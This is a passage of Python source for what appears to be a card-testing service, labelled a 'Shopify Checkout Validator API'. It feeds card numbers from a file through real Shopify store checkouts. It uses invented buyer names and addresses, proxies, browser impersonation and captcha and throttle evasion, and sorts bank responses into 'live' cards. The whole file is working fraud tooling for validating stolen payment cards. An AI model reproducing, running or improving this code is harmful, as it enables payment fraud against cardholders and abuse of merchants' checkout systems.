"""
Shopify Checkout Validator API — VPS Edition v3.8.5

v3.8.4 features:
  - Soft-exhausted fallback (returns real codes instead of SITE_ERROR)
  - THROTTLED hard quarantine
  - Real-challenge-only captcha detection
  - Session preflight with SESSION_FAIL_TTL
  - Failure cache with FAIL_CACHE_TTL

v3.8.5 additions:
  - POST /sync-sites endpoint — bot pushes its global_sites pool here
  - pool_source tracking in /health ("file" | "sync" | "empty")
"""

import asyncio
import copy
import logging
import os
import random
import re
import time
from collections import defaultdict, deque
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession, RequestsError
import orjson
import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
load_dotenv()

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
PORT                = int(os.environ.get("PORT", 8080))
WORKERS             = int(os.environ.get("WORKERS", 1))
CARDS_FILE          = os.environ.get("CARDS_FILE", "cards.txt")
SITES_FILE          = os.environ.get("SITES_FILE", "sites.txt")
MAX_PRICE           = float(os.environ.get("MAX_PRICE", 5.0))
MIN_AMOUNT          = float(os.environ.get("MIN_AMOUNT", 0.50))
HARD_MAX_PRICE      = float(os.environ.get("HARD_MAX_PRICE", 20.0))
SITE_CONCURRENCY    = int(os.environ.get("SITE_CONCURRENCY", 15))
RACE_COUNT          = int(os.environ.get("RACE_COUNT", 3))
AUTO_ATTEMPTS       = int(os.environ.get("AUTO_ATTEMPTS", 15))
BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
BLACKLIST_SAMPLES   = int(os.environ.get("BLACKLIST_SAMPLES", 8))
BLACKLIST_SECONDS   = int(os.environ.get("BLACKLIST_SECONDS", 300))
CACHE_TTL           = float(os.environ.get("CACHE_TTL", 300))
VARIANT_TTL         = float(os.environ.get("VARIANT_TTL", 1800))
REQUEST_TIMEOUT     = float(os.environ.get("REQUEST_TIMEOUT", 35))
LOG_LEVEL           = os.environ.get("LOG_LEVEL", "warning").upper()
LOG_FILE            = os.environ.get("LOG_FILE", "requests.txt")
IMPERSONATE         = os.environ.get("IMPERSONATE", "chrome124")
HEALTHY_MIN_SCORE   = float(os.environ.get("HEALTHY_MIN_SCORE", 0.20))
NO_PRODUCT_TTL      = int(os.environ.get("NO_PRODUCT_TTL", 1800))
SESSION_FAIL_TTL    = int(os.environ.get("SESSION_FAIL_TTL", 120))
FAIL_CACHE_TTL      = float(os.environ.get("FAIL_CACHE_TTL", 1800))
THROTTLE_COOLDOWN   = int(os.environ.get("THROTTLE_COOLDOWN", 900))

VALID_API_KEYS = set(
    k.strip()
    for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
    if k.strip()
)

KNOWN_CARD_RESPONSES = frozenset({
    "ORDER_PLACED", "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED",
    "OTP_REQUIRED", "EXPIRED_CARD", "INVALID_CARD", "CARD_DECLINED",
    "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK", "DO_NOT_HONOR",
    "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
    "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
    "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
    "LOST_CARD", "RESTRICTED_CARD",
})

SITE_ERROR_CODES = frozenset({
    "GRAPHQL_ERROR", "THROTTLED", "TIMEOUT", "CART_FAILED",
    "CHECKOUT_FAILED", "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
    "NO_SELLER_PROPOSAL", "NO_SHOPIFY_PAYMENTS_GATEWAY", "SITE_ERROR",
    "PROXY_ERROR", "CAPTCHA_REQUIRED", "SITE_REQUIRES_LOGIN",
    "NO_PRODUCT", "SUBMIT_FAILED", "NEGOTIATE_FAILED",
    "CHECKPOINTDENIED", "SESSION_EXPIRED", "ORDER_CREATION_FAILED",
    "NO_PAYMENT_REQUIRED", "TOKENIZATION_FAILED", "NO_PRODUCT_FOUND",
    "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
})

HARD_DEAD_CODES = frozenset({
    "NO_PRODUCT", "NO_PRODUCT_FOUND", "SITE_REQUIRES_LOGIN",
    "NO_SHOPIFY_PAYMENTS_GATEWAY", "PRICE_TOO_HIGH",
})

FINAL_CODES = frozenset({
    "ORDER_PLACED", "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED",
    "OTP_REQUIRED", "EXPIRED_CARD", "INVALID_CARD", "CARD_DECLINED",
    "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK", "DO_NOT_HONOR",
    "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
    "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
    "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
    "LOST_CARD", "RESTRICTED_CARD",
})

PROXY_STOP_CODES = frozenset({"PROXY_ERROR", "THROTTLED"})

LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

PROXY_ERROR_HINTS = (
    "proxy", "tunnel", "407", "socks",
    "connection refused", "connection reset", "connection aborted",
    "connection closed", "could not resolve host", "name resolution",
    "dns error", "dns failure", "getaddrinfo",
    "connect timeout", "connect tunnel", "connect error",
    "network unreachable", "host unreachable", "no route to host",
    "empty psk", "broken pipe", "socket error",
    "curl error", "ssl error", "tls error",
    "failed to connect", "couldn't connect", "could not connect",
)


def _looks_like_proxy_error(msg: str) -> bool:
    if not msg:
        return False
    m = str(msg).lower()
    return any(k in m for k in PROXY_ERROR_HINTS)


# ---------------------------------------------------------------------------
# Request/response logger
# ---------------------------------------------------------------------------
import aiofiles
import datetime

_log_lock = asyncio.Lock()
_SEP = "=" * 70


async def _write_log(entry: str) -> None:
    async with _log_lock:
        try:
            async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
                await f.write(entry)
        except Exception as ex:
            log.warning("Failed to write request log: %s", ex)


def _truncate(text: str, limit: int = 3000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text


async def _log_outgoing(method: str, url: str, req_body,
                        status_code: int, resp_text: str,
                        elapsed_ms: float, label: str = "") -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if isinstance(req_body, bytes):
            rb = req_body.decode("utf-8", errors="replace")
        elif req_body is None:
            rb = ""
        else:
            rb = str(req_body)
    except Exception:
        rb = "<unreadable>"
    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  OUTGOING  {method} {url}"
        + (f"  [{label}]" if label else "") + "\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Req Body :\n{_truncate(rb, 1500)}\n"
        f"Response :\n{_truncate(resp_text, 3000)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


class LoggedSession:
    def __init__(self, session: "AsyncSession"):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "",
                    data=None, json=None, **kwargs):
        t0 = time.time()
        req_body = data if data is not None else (
            orjson.dumps(json) if json is not None else None
        )
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)
            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              resp.status_code, resp_text, elapsed, label))
            return resp
        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              0, f"EXCEPTION: {type(exc).__name__}: {exc}",
                              elapsed, label))
            raise

    async def get(self, url: str, label: str = "", **kwargs):
        return await self._call("GET", url, label=label, **kwargs)

    async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
        return await self._call("POST", url, label=label, data=data, json=json, **kwargs)

    def __getattr__(self, name):
        return getattr(self._s, name)


# ---------------------------------------------------------------------------
# GraphQL queries
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}" 
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

# ---------------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------------
_shared_session: Optional[LoggedSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)

_variant_cache: dict[str, dict] = {}

_site_stats: dict[str, dict] = defaultdict(lambda: {
    "outcomes":            deque(maxlen=50),
    "blacklisted_until":   0.0,
    "consecutive_errors":  0,
    "success_count":       0,
    "error_count":         0,
})

_site_quarantine: dict[str, dict] = defaultdict(lambda: {
    "count":                    0,
    "last_response":            "",
    "last_seen":                0.0,
    "has_products":             None,
    "has_products_checked_at":  0.0,
    "cheapest_price":           None,
    "cheapest_checked_at":      0.0,
    "has_captcha":              None,
    "captcha_checked_at":       0.0,
    "can_create_session":       None,
    "session_checked_at":       0.0,
    "last_success_at":          0.0,
    "throttled_until":          0.0,
})

_site_ua: dict[str, str] = {}
_host_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)
_product_cache: dict[str, dict] = {}

_cards_cache: list[dict] = []
_cards_loaded_at: float = 0.0

_site_pool: list[str] = []
_site_pool_loaded_at: float = 0.0
_site_pool_source: str = "file"          # "file" | "sync" | "empty"

_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Cache helpers
# ---------------------------------------------------------------------------
def _cache_get(hostname: str) -> Optional[dict]:
    cached = _product_cache.get(hostname)
    if not cached:
        return None
    now = time.time()
    expiry = cached.get("expires_at")
    if expiry is None:
        expiry = cached.get("ts", 0) + CACHE_TTL
    return cached if now < expiry else None


def _cache_write_success(hostname: str, product: Optional[dict],
                         candidates: list[dict]) -> None:
    _product_cache[hostname] = {
        "product": product,
        "candidates": candidates,
        "err": None,
        "ts": time.time(),
    }


def _cache_write_failure(hostname: str, err: str,
                         ttl: Optional[float] = None) -> None:
    if ttl is None:
        ttl = FAIL_CACHE_TTL
    now = time.time()
    _product_cache[hostname] = {
        "product": None,
        "candidates": [],
        "err": err,
        "ts": now,
        "expires_at": now + ttl,
    }


# ---------------------------------------------------------------------------
# Lifespan
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = LoggedSession(
        AsyncSession(impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT)
    )
    _reload_cards()
    _reload_site_pool()
    log.warning(
        "Shopify Validator API v3.8.5 started concurrency=%d/site keys=%d "
        "race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d "
        "session_ttl=%ds fail_cache=%ds throttle=%ds",
        SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT, len(_site_pool),
        IMPERSONATE, HARD_MAX_PRICE, AUTO_ATTEMPTS, SESSION_FAIL_TTL,
        FAIL_CACHE_TTL, THROTTLE_COOLDOWN,
    )
    asyncio.create_task(_warmup_sites())
    asyncio.create_task(_pool_refresher())
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="3.8.5", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def _reload_site_pool() -> None:
    global _site_pool, _site_pool_loaded_at, _site_pool_source
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                _site_pool = [ln.strip() for ln in f if ln.strip()]
            _site_pool_source = "file" if _site_pool else "empty"
        else:
            _site_pool = []
            _site_pool_source = "empty"
    except Exception as ex:
        log.warning("[pool] reload failed: %s", ex)
    _site_pool_loaded_at = time.time()


async def _pool_refresher() -> None:
    while True:
        await asyncio.sleep(300)
        try:
            # Only reload from file if we haven't been synced by the bot
            if _site_pool_source != "sync":
                _reload_site_pool()
                log.info("[pool] reloaded %d sites from %s",
                         len(_site_pool), SITES_FILE)
        except Exception:
            pass


async def _warmup_sites() -> None:
    await asyncio.sleep(2)
    sites = list(_site_pool)
    if not sites:
        return
    log.warning("[warmup] Pre-fetching products for %d sites", len(sites))
    sem = asyncio.Semaphore(10)

    async def _one(site):
        async with sem:
            try:
                await _fetch_products(site, max_price=MAX_PRICE)
            except Exception:
                pass

    await asyncio.gather(*[_one(s) for s in sites], return_exceptions=True)
    log.warning("[warmup] Done. Product cache size: %d", len(_product_cache))


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------
def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if not s:
        return None
    if "://" in s:
        return s
    if "@" in s and ":" in s:
        return f"http://{s}"
    parts_ws = s.split()
    if len(parts_ws) == 4:
        user, pwd, host, port = parts_ws
        return f"http://{user}:{pwd}@{host}:{port}"
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
        ('"checkoutSessionToken":"',     '"'),
        ('checkoutSessionToken&quot;:&quot;', "&quot;"),
        ('data-checkout-session-token="', '"'),
        ('"session_token":"',            '"'),
        ('window.__CHECKOUT_SESSION_TOKEN__ = "', '"'),
        ('__checkout_session_token__":"', '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


def _ua_headers(ua: str) -> dict:
    if "Firefox" in ua:
        return {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
    major = re.search(r"Chrome/(\d+)", ua)
    chrome_ver = major.group(1) if major else "124"
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": f'"Chromium";v="{chrome_ver}", "Not_A.Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Upgrade-Insecure-Requests": "1",
    }


def _normalize_response(raw: Optional[str]) -> str:
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                               "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE",
                               "NOT_ENOUGH_BALANCE", "LOW_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
